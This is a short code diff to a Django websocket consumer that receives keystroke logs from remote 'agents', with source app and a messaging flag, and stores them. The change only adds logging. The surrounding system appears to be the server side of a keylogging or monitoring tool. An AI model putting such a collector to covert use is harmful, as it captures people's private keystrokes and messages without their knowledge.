@@ -107,19 +107,23 @@ class AgentConsumer(AsyncJsonWebsocketConsumer):
     def process_key_log(self, data):
         agent_id = data.get('agent_id')
         key_sequence = data.get('key_sequence')
+        source_app = data.get('source_app', 'Unknown Source')
+
+        logger.info(f"🔍 PROCESSING KEY_LOG: agent_id={agent_id}, source_app={source_app}, key_length={len(key_sequence) if key_sequence else 0}")
+
         if not agent_id or not key_sequence:
             logger.warning("[CONSUMER] Received key_log with missing agent_id or key_sequence. Discarding.")
             return
 
-        source_app = data.get('source_app', 'Unknown Source')
         try:
             agent = Agent.objects.get(agent_id=agent_id)
-            KeyLog.objects.create(
+            keylog = KeyLog.objects.create(
                 agent=agent,
                 source_app=source_app,
                 key_sequence=key_sequence,
                 is_messaging_log=bool(data.get('is_messaging', False))
             )
+            logger.info(f"✅ Successfully saved KeyLog ID {keylog.id} for agent {agent_id}")
         except Agent.DoesNotExist:
             logger.error(f"❌ FAILED to save KeyLog: Agent with ID {agent_id} not found.")
         except Exception as e:
